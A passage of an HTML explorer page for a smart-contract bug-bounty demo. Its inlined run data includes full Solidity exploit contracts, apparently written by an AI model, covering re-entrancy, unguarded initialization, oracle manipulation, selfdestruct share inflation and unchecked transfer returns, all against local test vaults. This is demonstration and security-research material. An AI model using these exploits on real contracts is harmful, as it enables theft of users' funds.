second opinion: the review was answered by the router's last-resort model, not a miner","tx":null},"attempts":[{"n":1,"model":"claude-sonnet-5-5","cost":0.017076,"valid":true,"reason":"breaks invariant on vulnerable, holds on patched"}],"sol":"pragma solidity 0.8.28;\n\ninterface IVault {\n    function deposit(uint256 amount) external;\n}\n\ncontract Exploit {\n    address public vault;\n\n    constructor(address target) payable {\n        vault = target;\n    }\n\n    function run() external {\n        try IVault(vault).deposit(1 ether) {} catch {}\n    }\n}\n","solved":true,"reason":"breaks invariant on vulnerable, holds on patched","commitTx":"0x944bdf0ea9be5732dff821fcd8b452129b2f8b9a18a5e9aebfd8d7741f1095b3","resolveTx":"0x1ac1d486184f5e036f629bc360e069209f6d51c9255b586e338af791ace7f743"}]},{"id":"live-2026-11-24T03-54-24-021Z","kind":"live","label":"Live · 2026-11-24","at":"2026-11-24T03:54:26.839Z","note":"First 5-target live run. The review miner was Salence; the patch check was routed to Judge0, a sandbox that cannot compile Solidity, so it always answered “failure”.","backend":"cli","spend":0.15,"modelCost":0.1072465,"modelCalls":5,"solved":5,"withdrawTx":"0xb6ac39bcaafd4a86e62380f85a36e427d51fa7a81014ddd793b8b9681f3eb4e0","targets":[{"id":"hook-vault","bounty":"0","cls":"reentrancy","invariant":"each honest user's token balance afterwards is at least what they deposited (3, 3 and 4 ether worth).","purchases":[{"role":"review","intent":"SECURITY_REVIEW_GENERAL","status":200,"miner":"Salence","tx":"0x02ded6314611934293def4e590918ddc2e7568f625c61c1d6a27b01a7fc45905","mode":"live"},{"role":"triage","intent":"VULNERABILITY_TRIAGE_GENERAL","status":200,"miner":"ChainSight — Universal Intelligence & Data Oracle","tx":"0x34804ad40cf5d777a925f7c1bfc7ad9d48ba030fd61d9b896dc598cacc03848f","mode":"live"},{"role":"patch_verify","intent":"CODE_PATCH_VERIFY_GENERAL","status":200,"miner":"Judge0 CE Patch Verify","tx":"0x086f77998ab5f13a96fda19794a9ea7eb9489051109a825f495d187381c8a199","mode":"live"}],"review":{"verdict":"wrong","reviewer":"Salence","defect":false,"label":"No security defect found","summary":"Model review found no security defect tied to a specific line of this Solidity code, but the second review was unavailable, so this is not a clean result.","tx":"0x02ded6314611934293def4e590918ddc2e7568f625c61c1d6a27b01a7fc45905"},"attempts":[{"n":1,"model":"claude-sonnet-5-5","cost":0.035276,"valid":true,"reason":"breaks invariant on vulnerable, holds on patched"}],"sol":"pragma solidity 0.8.28;\n\ninterface IVault {\n    function token() external view returns (address);\n    function deposit(uint) external;\n    function withdraw(uint) external;\n    function transfer(address, uint) external;\n    function balanceOf(address) external view returns (uint);\n}\n\ninterface IToken {\n    function wrap() external payable;\n    function approve(address, uint) external returns (bool);\n    function balanceOf(address) external view returns (uint);\n}\n\ncontract Helper {\n    IVault vault;\n    address owner;\n    constructor(address v) { vault = IVault(v); owner = msg.sender; }\n    function back() external {\n        vault.transfer(owner, vault.balanceOf(address(this)));\n    }\n}\n\ncontract Exploit {\n    IVault vault;\n    IToken token;\n    Helper helper;\n    bool mode;\n\n    constructor(address target) payable {\n        vault = IVault(target);\n        token = IToken(vault.token());\n        helper = new Helper(target);\n        token.wrap{value: msg.value}();\n        token.approve(target, type(uint).max);\n        vault.deposit(msg.value);\n    }\n\n    function onTokenReceived(address, uint amount) external {\n        if (mode) {\n            mode = false;\n            vault.transfer(address(helper), amount);\n        }\n    }\n\n    function run() external {\n        for (uint i = 0; i \u003c 4; i++) {\n            uint c = vault.balanceOf(address(this));\n            mode = true;\n            vault.withdraw(c);\n            vault.deposit(c);\n            helper.back();\n        }\n        uint bal = token.balanceOf(address(vault));\n        uint cred = vault.balanceOf(address(this));\n        vault.withdraw(bal \u003c cred ? bal : cred);\n    }\n}\n","solved":true,"reason":"breaks invariant on vulnerable, holds on patched","commitTx":"0x78566304d7fdffc225e65cb38201f8ef61b95290a326425141832426d634aea1","resolveTx":"0x889a4fff85b25ae299e7b58fbb0ff4dd326e1b795f5e162c349d4135503aaad9"},{"id":"init-vault","bounty":"1","cls":"access-control","invariant":"address(vault).balance >= vault.totalDeposits().","purchases":[{"role":"review","intent":"SECURITY_REVIEW_GENERAL","status":200,"miner":"Salence","tx":"0x5f255d916c30781dd35719e7b02e871b1111606cae8b923fa23ee5789d398aff","mode":"live"},{"role":"triage","intent":"VULNERABILITY_TRIAGE_GENERAL","status":200,"miner":"ChainSight — Universal Intelligence & Data Oracle","tx":"0x0829a923a59d9de6a0fc589573dc8664e24c14ddc84f953514ed288f3c46e352","mode":"live"},{"role":"patch_verify","intent":"CODE_PATCH_VERIFY_GENERAL","status":200,"miner":"Judge0 CE Patch Verify","tx":"0xd908770ef882e8650f5b40c4cbf3457b6bd463485febfd6ff9eb320a950336c4","mode":"live"}],"review":{"verdict":"wrong","reviewer":"Salence","defect":false,"label":"“Secure”, 0 issues","summary":"Two independent model reviews found no security defect in this Solidity code; runtime behaviour and other files were not seen.","tx":"0x5f255d916c30781dd35719e7b02e871b1111606cae8b923fa23ee5789d398aff"},"attempts":[{"n":1,"model":"claude-sonnet-5-5","cost":0.018174,"valid":true,"reason":"breaks invariant on vulnerable, holds on patched"}],"sol":"// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\ninterface IVault {\n    function initialize(address owner_, uint256 withdrawLimit_) external;\n    function setPaused(bool p) external;\n    function emergencyWithdraw(address payable to) external;\n}\n\ncontract Exploit {\n    IVault public vault;\n\n    constructor(address target) payable {\n        vault = IVault(target);\n    }\n\n    function run() external {\n        vault.initialize(address(this), type(uint256).max);\n        vault.setPaused(true);\n        vault.emergencyWithdraw(payable(address(this)));\n    }\n\n    receive() external payable {}\n}\n","solved":true,"reason":"breaks invariant on vulnerable, holds on patched","commitTx":"0x1a5309d41e32f2405f7e65efc3e2a373374e55ee5583a9a2ef20abfcff69914d","resolveTx":"0x1e271855d534c821c8a1932aa4faab90ad4ad5e5f7f8d18a9eec5cb3f45a1716"},{"id":"lend-pool","bounty":"2","cls":"oracle-manipulation","invariant":"pool.totalCollateral() * 0.001 ether / 1e18 >= pool.totalDebt().","purchases":[{"role":"review","intent":"SECURITY_REVIEW_GENERAL","status":200,"miner":"Salence","tx":"0x561a3a3d6d1cf582ce9a81f9a2bcbb409f00833f296fe8b055172003518e06ee","mode":"live"},{"role":"triage","intent":"VULNERABILITY_TRIAGE_GENERAL","status":200,"miner":"ChainSight — Universal Intelligence & Data Oracle","tx":"0xf4445716b15a3e28134ef7b4411a6a945a00d1bfb7987a56f64030329a9471a6","mode":"live"},{"role":"patch_verify","intent":"CODE_PATCH_VERIFY_GENERAL","status":200,"miner":"Judge0 CE Patch Verify","tx":"0x49d6f5af7d96f37322d2ae39268644f5d9a51790e19d26e84ef05e48d921e12f","mode":"live"}],"review":{"verdict":"wrong","reviewer":"Salence","defect":false,"label":"No security defect found","summary":"Model review found no security defect tied to a specific line of this Solidity code, but the second review was unavailable, so this is not a clean result.","tx":"0x561a3a3d6d1cf582ce9a81f9a2bcbb409f00833f296fe8b055172003518e06ee"},"attempts":[{"n":1,"model":"claude-sonnet-5-5","cost":0.022918,"valid":true,"reason":"breaks invariant on vulnerable, holds on patched"}],"sol":"// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\ninterface ILendPool {\n    function buyGov() external payable;\n    function depositCollateral(uint amount) external;\n    function borrow(uint amount) external;\n    function govOf(address) external view returns (uint);\n    function totalSupplied() external view returns (uint);\n}\n\ncontract Exploit {\n    ILendPool pool;\n\n    constructor(address target) payable {\n        pool = ILendPool(target);\n    }\n\n    function run() external {\n        pool.buyGov{value: address(this).balance}();\n        uint g = pool.govOf(address(this));\n        pool.depositCollateral(g);\n        pool.borrow(pool.totalSupplied());\n    }\n\n    receive() external payable {}\n}\n","solved":true,"reason":"breaks invariant on vulnerable, holds on patched","commitTx":"0x815cd398a6483a4109f7143703ea8f426fdbecda71f31a8107eb0d3cc6630366","resolveTx":"0x3d8a0d78dcfc687f3d867234af0c5dcc17c30d088957b7baa0b05f166c21d8a7"},{"id":"share-vault","bounty":"3","cls":"share-inflation","invariant":"each of A and B receives at least 99% of the ether they deposited.","purchases":[{"role":"review","intent":"SECURITY_REVIEW_GENERAL","status":200,"miner":"Salence","tx":"0xc689adc1b7a38c5cc8d640ff4058b392a7bfd9a39ebc7dc10976655181099c86","mode":"live"},{"role":"triage","intent":"VULNERABILITY_TRIAGE_GENERAL","status":200,"miner":"ChainSight — Universal Intelligence & Data Oracle","tx":"0xebf01798b984773e660b30dcdf1654faa52bb6f4a34c1fa5f8b3b47de811a7ef","mode":"live"},{"role":"patch_verify","intent":"CODE_PATCH_VERIFY_GENERAL","status":200,"miner":"Judge0 CE Patch Verify","tx":"0xa5b873da61a32c79da5e759db2e0800010fd20b98801a8d07685ece0dc7eb89a","mode":"live"}],"review":{"verdict":"wrong","reviewer":"Salence","defect":false,"label":"No security defect found","summary":"Model review found no security defect tied to a specific line of this Solidity code, but the second review was unavailable, so this is not a clean result.","tx":"0xc689adc1b7a38c5cc8d640ff4058b392a7bfd9a39ebc7dc10976655181099c86"},"attempts":[{"n":1,"model":"claude-sonnet-5-5","cost":0.013468500000000001,"valid":true,"reason":"breaks invariant on vulnerable, holds on patched"}],"sol":"// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\ninterface IVault {\n    function deposit() external payable returns (uint256);\n}\n\ncontract Burner {\n    constructor(address target) payable {\n        selfdestruct(payable(target));\n    }\n}\n\ncontract Exploit {\n    address public vault;\n\n    constructor(address target) payable {\n        vault = target;\n    }\n\n    function run() external {\n        IVault(vault).deposit{value: 1}();\n        new Burner{value: address(this).balance}(vault);\n    }\n\n    receive() external payable {}\n}\n","solved":true,"reason":"breaks invariant on vulnerable, holds on patched","commitTx":"0x04313fe6fa776d5a9c0452b97a69b65b526e33b12db8484b85a63cd77a2d4e03","resolveTx":"0xf115e825c2576e0da06f75586c1917851b47ca20dcfc9ed0ee1a7c8314d9de85"},{"id":"token-vault","bounty":"4","cls":"unchecked-return","invariant":"token.balanceOf(address(vault)) >= vault.totalDeposits().","purchases":[{"role":"review","intent":"SECURITY_REVIEW_GENERAL","status":200,"miner":"Salence","tx":"0x89bf0894cdf7740bbfef6297dabc7b6d15cda806c3abb3bb0508ccbaf7247dc7","mode":"live"},{"role":"triage","intent":"VULNERABILITY_TRIAGE_GENERAL","status":200,"miner":"ChainSight — Universal Intelligence & Data Oracle","tx":"0xdc7b0a5265a2ae8d797ea5435a61695333405d2fdbd455c24c46eb03c9c52667","mode":"live"},{"role":"patch_verify","intent":"CODE_PATCH_VERIFY_GENERAL","status":200,"miner":"Judge0 CE Patch Verify","tx":"0xd7a2b7a8eb3fc49565b12a0d131b1b246b52ea3a8274f0f0f2cadf3f6285530b","mode":"live"}],"review":{"verdict":"wrong","reviewer":"Salence","defect":false,"label":"No security defect found","summary":"Model review found no security defect tied to a specific line of this Solidity code, but the second review was unavailable, so this is not a clean result.","tx":"0x89bf0894cdf7740bbfef6297dabc7b6d15cda806c3abb3bb0508ccbaf7247dc7"},"attempts":[{"n":1,"model":"claude-sonnet-5-5","cost":0.017410000000000002,"valid":true,"reason":"breaks invariant on vulnerable, holds on patched"}],"sol":"// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\ninterface IVault {\n    function deposit(uint256 amount) external;\n}\n\ncontract Exploit {\n    address public vault;\n\n    constructor(address target) payable {\n        vault = target;\n    }\n\n    function run() external {\n        // No tokens, no approval: transferFrom returns false, but the vault still credits us.\n        try IVault(vault).deposit(1 ether) {} catch {}\n    }\n}\n","solved":true,"reason":"breaks invariant on vulnerable, holds on patched","commitTx":"0xc3c8f7f6da87f9f6656bd4760d51b9decedda024852b162220a8c0107977134f","resolveTx":"0x5e3cf6b34dccea0cf2c6dcce55d0e15d0362e005fedb6703450244dedf0043d3"}]},{"id":"mock-2026-11-26T22-38-08-047Z","kind":"offline","label":"Offline replay","at":"2026-11-26T22:38:08.416Z","note":"Runs with no keys: a local Telegraph mock and the recorded model outputs (0 model calls, $0). The escrow, the exploits and the verifier are real and run locally.","backend":"replay","spend":0,"modelCost":0,"modelCalls":0,"solved":5,"withdrawTx":"0x87c80a59e0aad239573e0b956698ab2ea508faccf437878fc9d81b40e2027f16","targets":[{"id":"hook-vault","bounty":"0","cls":"reentrancy","invariant":"each honest user's token balance afterwards is at least what they deposited (3, 3 and 4 ether worth).","purchases":[{"role":"review","intent":"SECURITY_REVIEW_GENERAL","status":200,"miner":null,"tx":null,"mode":"mock"},{"role":"triage","intent":"VULNERABILITY_TRIAGE_GENERAL","status":200,"miner":null,"tx":null,"mode":"mock"},{"role":"patch_verify","intent":"CODE_PATCH_VERIFY_GENERAL","status":200,"miner":null,"tx":null,"mode":"mock"}],"review":{"verdict":"wrong","reviewer":"mock-miner","defect":false,"label":"“Needs changes”, 0 issues","summary":"MOCK ANSWER. No analysis was performed.","tx":null},"attempts":[{"n":1,"model":"claude-sonnet-5-5","cost":0,"valid":true,"reason":"breaks invariant on vulnerable, holds on patched"}],"sol":"// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\ninterface IToken {\n    function wrap() external payable;\n    function approve(address, uint) external returns (bool);\n    function balanceOf(address) external view returns (uint);\n}\n\ninterface IVault {\n    function token() external view returns (address);\n    function deposit(uint) external;\n    function withdraw(uint) external;\n    function transfer(address, uint) external;\n}\n\ncontract Helper {\n    IVault vault;\n    address owner;\n    constructor(address v, address o) { vault = IVault(v); owner = o; }\n    function back(uint amt) external {\n        vault.transfer(owner, amt);\n    }\n}\n\ncontract Exploit {\n    IVault vault;\n    IToken token;\n    Helper helper;\n    bool active;\n\n    constructor(address target) payable {\n        vault = IVault(target);\n        token = IToken(vault.token());\n        helper = new Helper(target, address(this));\n        token.wrap{value: msg.value}();\n        token.approve(target, msg.value);\n        vault.deposit(msg.value);\n    }\n\n    function run() external {\n        uint amt = 1 ether;\n        for (uint i = 0; i \u003c 11; i++) {\n            active = true;\n            vault.withdraw(amt);\n            active = false;\n            helper.back(amt);\n        }\n    }\n\n    function onTokenReceived(address, uint amount) external {\n        if (active && msg.sender == address(token)) {\n            active = false;\n            vault.transfer(address(helper), amount);\n        }\n    }\n}\n","solved":true,"reason":"breaks invariant on vulnerable, holds on patched","commitTx":"0xaed999436f275ba28182fad92a26a37bc038ff5436dd7380b93f85092ca3450d","resolveTx":"0xca6be4a733149fe3762ebd70c06870b720ef955df30f0ac44a0a3eee3bc38559"},{"id":"init-vault","bounty":"1","cls":"access-control","invariant":"address(vault).balance >= vault.totalDeposits().","purchases":[{"role":"review","intent":"SECURITY_REVIEW_GENERAL","status":200,"miner":null,"tx":null,"mode":"mock"},{"role":"triage","intent":"VULNERABILITY_TRIAGE_GENERAL","status":200,"miner":null,"tx":null,"mode":"mock"},{"role":"patch_verify","intent":"CODE_PATCH_VERIFY_GENERAL","status":200,"miner":null,"tx":null,"mode":"mock"}],"review":{"verdict":"wrong","reviewer":"mock-miner","defect":false,"label":"“Needs changes”, 0 issues","summary":"MOCK ANSWER. No analysis was performed.","tx":null},"attempts":[{"n":1,"model":"claude-sonnet-5-5","cost":0,"valid":true,"reason":"breaks invariant on vulnerable, holds on patched"}],"sol":"// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\ninterface IInitVault {\n    function initialize(address owner_, uint256 withdrawLimit_) external;\n    function setPaused(bool paused_) external;\n    function emergencyWithdraw(address payable to) external;\n}\n\ncontract Exploit {\n    IInitVault public vault;\n\n    constructor(address target) payable {\n        vault = IInitVault(target);\n    }\n\n    function run() external {\n        vault.initialize(address(this), 5 ether);\n        vault.setPaused(true);\n        vault.emergencyWithdraw(payable(address(this)));\n    }\n\n    receive() external payable {}\n}\n","solved":true,"reason":"breaks invariant on vulnerable, holds on patched","commitTx":"0x7f423f346a0662be7d302798143fdbd5d0bdc59f049d853f791d4994cb144f1a","resolveTx":"0xf1cf50a19b24e6d18c3b8ecf1ebf6b9d368f103fd2ce763a2b5e243c8d1d8131"},{"id":"lend-pool","bounty":"2","cls":"oracle-manipulation","invariant":"pool.totalCollateral() * 0.001 ether / 1e18 >= pool.totalDebt().","purchases":[{"role":"review","intent":"SECURITY_REVIEW_GENERAL","status":200,"miner":null,"tx":null,"mode":"mock"},{"role":"triage","intent":"VULNERABILITY_TRIAGE_GENERAL","status":200,"miner":null,"tx":null,"mode":"mock"},{"role":"patch_verify","intent":"CODE_PATCH_VERIFY_GENERAL","status":200,"miner":null,"tx":null,"mode":"mock"}],"review":{"verdict":"wrong","reviewer":"mock-miner","defect":false,"label":"“Needs changes”, 0 issues","summary":"MOCK ANSWER. No analysis was performed.","tx":null},"attempts":[{"n":1,"model":"claude-sonnet-5-5","cost":0,"valid":true,"reason":"breaks invariant on vulnerable, holds on patched"}],"sol":"// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\ninterface ILendPool {\n    function buyGov() external payable;\n    function govOf(address) external view returns (uint);\n    function depositCollateral(uint amount) external;\n    function borrow(uint amount) external;\n}\n\ncontract Exploit {\n    ILendPool pool;\n\n    constructor(address target) payable {\n        pool = ILendPool(target);\n    }\n\n    function run() external {\n        pool.buyGov{value: address(this).balance}();\n        uint g = pool.govOf(address(this));\n        pool.depositCollateral(g);\n        pool.borrow(10 ether);\n    }\n\n    receive() external payable {}\n}\n","solved":true,"reason":"breaks invariant on vulnerable, holds on patched","commitTx":"0x7484944fb610aa8f60ebff536c583d6ce4181b81dd7c31873bdbfcb28dc780f2","resolveTx":"0x375904f04eb9e4293b186f049f2a627dfd2bd8928e8f785caa0a1f3887bef8ad"},{"id":"share-vault","bounty":"3","cls":"share-inflation","invariant":"each of A and B receives at least 99% of the ether they deposited.","purchases":[{"role":"review","intent":"SECURITY_REVIEW_GENERAL","status":200,"miner":null,"tx":null,"mode":"mock"},{"role":"triage","intent":"VULNERABILITY_TRIAGE_GENERAL","status":200,"miner":null,"tx":null,"mode":"mock"},{"role":"patch_verify","intent":"CODE_PATCH_VERIFY_GENERAL","status":200,"miner":null,"tx":null,"mode":"mock"}],"review":{"verdict":"wrong","reviewer":"mock-miner","defect":false,"label":"“Needs changes”, 0 issues","summary":"MOCK ANSWER. No analysis was performed.","tx":null},"attempts":[{"n":1,"model":"claude-sonnet-5-5","cost":0,"valid":true,"reason":"breaks invariant on vulnerable, holds on patched"}],"sol":"// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\ninterface IVault {\n    function deposit() external payable returns (uint256);\n}\n\ncontract Donor {\n    constructor(address payable target) payable {\n        selfdestruct(target);\n    }\n}\n\ncontract Exploit {\n    address public target;\n\n    constructor(address _target) payable {\n        target = _target;\n    }\n\n    function run() external {\n        IVault(target).deposit{value: 1}();\n        new Donor{value: address(this).balance}(payable(target));\n    }\n}\n","solved":true,"reason":"breaks invariant on vulnerable, holds on patched","commitTx":"0x17ef4b22476ff167e65eaa69f6c531fc2b4fbc1f63e2793148505464d203cae6","resolveTx":"0x1626b5647867416ed1243dfa9d6cc12e0e9a236b504940ab4ff463bfc006b910"},{"id":"token-vault","bounty":"4","cls":"unchecked-return","invariant":"token.balanceOf(address(vault)) >= vault.totalDeposits().","purchases":[{"role":"review","intent":"SECURITY_REVIEW_GENERAL","status":200,"miner":null,"tx":null,"mode":"mock"},{"role":"triage","intent":"VULNERABILITY_TRIAGE_GENERAL","status":200,"miner":null,"tx":null,"mode":"mock"},{"role":"patch_verify","intent":"CODE_PATCH_VERIFY_GENERAL","status":200,"miner":null,"tx":null,"mode":"mock"}],"review":{"verdict":"wrong","reviewer":"mock-miner","defect":false,"label":"“Needs changes”, 0 issues","summary":"MOCK ANSWER. No analysis was performed.","tx":null},"attempts":[{"n":1,"model":"claude-sonnet-5-5","cost":0,"valid":true,"reason":"breaks invariant on vulnerable, holds on patched"}],"sol":"// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\ninterface IVault {\n    function deposit(uint256 amount) external;\n}\n\ncontract Exploit {\n    address public vault;\n\n    constructor(address target) payable {\n        vault = target;\n    }\n\n    function run() external {\n        // No tokens, no approval: transferFrom returns false, but the vault still credits us.\n        try IVault(vault).deposit(1_000_000 ether) {} catch {}\n    }\n}\n","solved":true,"reason":"breaks invariant on vulnerable, holds on patched","commitTx":"0x52314c6054e0f85e663782cebb496e3035d12b72b12c17f7f761956f80f540a7","resolveTx":"0x78c2463ff71c15351754276baf6bd1c2a5ea44e972d79682526b44ad4af5b128"}]}]}</script>
+<script>
+// Explorer page logic. Data is inlined by scripts/build-explorer.mjs.
+const DATA = JSON.parse(document.getElementById("data").textContent);
+const CLS = {
+  reentrancy: "Re-entrancy",
+  "access-control": "Access control",
+  "oracle-manipulation": "Price-oracle manipulation",
+  "share-inflation": "Share inflation",
+  "unchecked-return": "Unchecked return value",
+};
+const ROLE = {
+  review: "Security review",
+  triage: "Triage",
+  patch_verify: "Patch check",
+};
+const short = (h) => (h ? h.slice(0, 10) + "…" + h.slice(-4) : "");
+const esc = (s) =>
+  String(s ?? "").replace(
+    /[&<>"]/g,
+    (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" })[c],
+  );
+const bs = (tx) =>
+  `<a class="mono" href="https://base-sepolia.blockscout.com/tx/${tx}" target="_blank" rel="noopener">${short(tx)}</a>`;
+const local = (tx) =>
+  tx
+    ? `<span class="mono">${short(tx)}</span> <span class="chip">local chain</span>`
+    : "-";
+const cls = (c) => CLS[c] || c || "bug";
+const usd = (n) => "$" + Number(n).toFixed(2);
+
+let R = 0; // run index
+let cur = 0; // target index
+let timer = null;
+
+function slug(r) {
+  return r.kind === "live" ? "live-" + r.at.slice(0, 10) : "offline";
+}
+
+function reviewState(t) {
+  const v = t.review.verdict;
+  if (v === "wrong")
+    return {
+      pill: "wrong",
+      text:
+        DATA.runs[R].kind === "live"
+          ? "review said no defect"
+          : "mock review said no defect",
+    };
+  if (v === "right") return { pill: "right", text: "review found it" };
+  return { pill: "none", text: "no review delivered" };
+}
+
+function runs() {
+  document.getElementById("runs").innerHTML = DATA.runs
+    .map(
+      (r, i) =>
+        `<button type="button" aria-pressed="${i === R}" data-r="${i}">${esc(r.label)}</button>`,
+    )
+    .join("");
+  document.querySelectorAll("#runs button").forEach(
+    (b) =>
+      (b.onclick = () => {
+        selectRun(+b.dataset.r, true);
+      }),
+  );
+}
+
+function strip() {
+  const r = DATA.runs[R];
+  const T = r.targets;
+  const purchases = T.reduce((n, t) => n + t.purchases.length, 0);
+  const settled = T.reduce(
+    (n, t) => n + t.purchases.filter((p) => p.status === 200 && p.tx).length,
+    0,
+  );
+  const reviewed = T.filter(
+    (t) => t.review.verdict === "wrong" || t.review.verdict === "right",
+  );
+  const right = reviewed.filter((t) => t.review.verdict === "right").length;
+  const live = r.kind === "live";
+  document.getElementById("strip").innerHTML = [
+    ["good", `${r.solved}/${T.length}`, "bugs proven by the verifier"],
+    reviewed.length
+      ? [
+          "bad",
+          `${right}/${reviewed.length}`,
+          live
+            ? "paid reviews that found the bug"
+            : "mock reviews that found the bug",
+        ]
+      : ["", "none", "reviews delivered (payments failed)"],
+    live
+      ? [
+          "",
+          `${settled}/${purchases}`,
+          "Telegraph purchases settled on Base Sepolia",
+        ]
+      : [
+          "",
+          `${purchases}`,
+          "purchases from a local Telegraph mock, nothing paid",
+        ],
+    [
+      "",
+      `${usd(live ? settled * 0.01 : 0)} + ${usd(r.modelCost)}`,
+      `Telegraph settled + model cost (${r.modelCalls} model calls)`,
+    ],
+    [
+      "good",
+      `${T.filter((t) => t.solved).length} ETH`,
+      "paid out to the hunter (local chain)",
+    ],
+  ]
+    .map(
+      ([c, b, s]) =>
+        `<div class="stat ${c}"><b>${b}</b><small>${s}</small></div>`,
+    )
+    .join("");
+  const note = document.getElementById("runnote");
+  note.textContent = r.note || "";
+  note.hidden = !r.note;
+  document.getElementById("listlbl").textContent =
+    `${T.length} bounties · 1 ETH each`;
+}
+
+function list() {
+  const r = DATA.runs[R];
+  document.getElementById("list").innerHTML = r.targets
+    .map((t, i) => {
+      const rs = reviewState(t);
+      return `<button type="button" class="bounty" aria-current="${i === cur}" data-i="${i}">
+        <span class="n">${esc(t.id)}</span><span class="pill ${t.solved ? "paid" : "none"}">${t.solved ? "Paid" : "Open"}</span>
+        <span class="c">${esc(cls(t.cls))} · ${rs.text}</span></button>`;
+    })
+    .join("");
+  document.querySelectorAll(".bounty").forEach(
+    (b) =>
+      (b.onclick = () => {
+        cur = +b.dataset.i;
+        stop();
+        list();
+        show(4);
+      }),
+  );
+}
+
+function opinionBox(t, live) {
+  const rv = t.review;
+  const pr = t.purchases.find((p) => p.role === "review");
+  if (rv.verdict === "wrong" || rv.verdict === "right") {
+    const who = live
+      ? `${esc(rv.reviewer)}, $0.01${rv.tx ? ", " + bs(rv.tx) : ""}`
+      : "Local mock miner, nothing paid";
+    return `<div class="op"><span class="lbl">${live ? "Paid review (opinion)" : "Mock review (opinion)"}</span>
+      <strong>${esc(rv.label || "No security defect found")}</strong>
+      <p>${who}</p><p>${esc(rv.summary || "")}</p></div>`;
+  }
+  return `<div class="op"><span class="lbl">Paid review (opinion)</span><strong>No review delivered</strong>
+    <p>The purchase returned HTTP ${pr ? pr.status : "-"}: the payment did not settle, so nothing was bought and nothing reached the model.</p></div>`;
+}
+
+function attemptsText(t) {
+  const last = t.attempts[t.attempts.length - 1] || {};
+  const failed = t.attempts.filter((a) => a.valid === false);
+  let s = `${esc(last.model || "-")}, attempt ${t.attempts.length}`;
+  if (failed.length)
+    s += `. Rejected first: ${failed.map((a) => `attempt ${a.n} (${esc(a.reason)})`).join("; ")}; the retry got that feedback`;
+  return s;
+}
+
+function show(upto) {
+  const r = DATA.runs[R];
+  const live = r.kind === "live";
+  const t = r.targets[cur];
+  const st = (n) => (n <= upto ? "done" : "dim");
+  const cost = t.attempts.reduce((n, a) => n + (a.cost || 0), 0);
+  const purchaseRows = t.purchases
+    .map((p) => {
+      const paid = !live
+        ? `<span class="chip">mock</span>`
+        : p.status === 200
+          ? `$0.01 <span class="ok">200</span>`
+          : `<span class="chip">HTTP ${p.status}</span>`;
+      const where = p.tx ? bs(p.tx) : live ? "not settled" : "-";
+      return `<tr><td>${ROLE[p.role] || esc(p.role)}</td><td>${esc(p.miner || (live ? "-" : "local mock"))}</td><td>${paid}</td><td>${where}</td></tr>`;
+    })
+    .join("");
+  document.getElementById("case").innerHTML = `
+    <div class="casehead"><div><div class="lbl">Bounty #${esc(t.bounty)} · reward 1 ETH</div><h2>${esc(t.id)}</h2></div>
+      <button type="button" class="replay" id="replay">Replay this hunt</button></div>
+    <div class="vs">
+      ${opinionBox(t, live)}
+      <div class="pr"><span class="lbl">Verifier (proof)</span><strong>${t.solved ? "Bug proven: " + esc(cls(t.cls)) : "No valid proof"}</strong>
+        <p>${esc(t.reason || "")}${t.solved ? ". Escrow paid 1 ETH." : ""}</p></div>
+    </div>
+    <ol class="steps">
+      <li class="step ${st(1)}"><span class="num">1</span><div><h3>Poster locks the reward and the rule</h3>
+        <dl class="kv"><dt>Invariant</dt><dd class="mono">${esc(t.invariant)}</dd><dt>Reward</dt><dd>1 ETH in BountyEscrow</dd></dl></div></li>
+      <li class="step ${st(2)}"><span class="num">2</span><div><h3>Hunter buys reviews on Telegraph over x402</h3>
+        <div class="tw"><table><tr><th>Purchase</th><th>Provider</th><th>Paid</th><th>Settlement</th></tr>${purchaseRows}</table></div></div></li>
+      <li class="step ${st(3)}"><span class="num">3</span><div><h3>Claude writes an exploit it has never seen</h3>
+        <dl class="kv"><dt>Model</dt><dd>${attemptsText(t)}</dd><dt>Model cost</dt><dd>${live ? "$" + cost.toFixed(4) : "$0 (recorded output replayed)"}</dd><dt>Commit</dt><dd>${local(t.commitTx)}</dd></dl>
+        ${t.sol ? `<details><summary>Show the exploit (${t.sol.trim().split("\n").length} lines)</summary><pre>${esc(t.sol)}</pre></details>` : ""}</div></li>
+      <li class="step ${st(4)}"><span class="num">4</span><div><h3>Deterministic verifier decides</h3>
+        <div class="checks"><div class="check"><b>Vulnerable contract</b><span class="ok">Invariant broken</span> by the exploit</div>
+        <div class="check"><b>Patched contract</b><span class="ok">Invariant holds</span> against the same exploit</div></div>
+        <dl class="kv" style="margin-top:10px"><dt>Verdict</dt><dd>${t.solved ? "Valid. 1 ETH credited to the hunter that committed the proof" : "Invalid"}</dd><dt>Payout tx</dt><dd>${local(t.resolveTx)}</dd></dl></div></li>
+    </ol>`;
+  document.getElementById("replay").onclick = replay;
+}
+
+function stop() {
+  if (timer) {
+    clearInterval(timer);
+    timer = null;
+  }
+}
+
+function replay() {
+  stop();
+  let k = 0;
+  show(0);
+  if (matchMedia("(prefers-reduced-motion: reduce)").matches) {
+    show(4);
+    return;
+  }
+  timer = setInterval(() => {
+    k++;
+    show(k);
+    if (k >= 4) stop();
+  }, 1100);
+}
+
+function selectRun(i, push) {
+  stop();
+  R = i;
+  const T = DATA.runs[R].targets;
+  cur = Math.max(
+    0,
+    T.findIndex((t) => t.id === "lend-pool"),
+  );
+  runs();
+  strip();
+  list();
+  show(4);
+  if (push) history.replaceState(null, "", "#" + slug(DATA.runs[R]));
+}
+
+document.querySelectorAll("[data-copy]").forEach(
+  (b) =>
+    (b.onclick = async () => {
+      const el = document.getElementById(b.dataset.copy);
+      try {
+        await navigator.clipboard.writeText(el.textContent);
+        b.textContent = "Copied";
+      } catch (e) {
+        const sel = getSelection();
+        const rg = document.createRange();
+        rg.selectNodeContents(el);
+        sel.empty();
+        sel.addRange(rg);
+        b.textContent = "Selected";
+      }
+      setTimeout(() => (b.textContent = "Copy"), 1500);
+    }),
+);
+
+function fromHash() {
+  const h = location.hash.slice(1);
+  const i = DATA.runs.findIndex((r) => slug(r) === h);
+  selectRun(i >= 0 ? i : 0, false);
+}
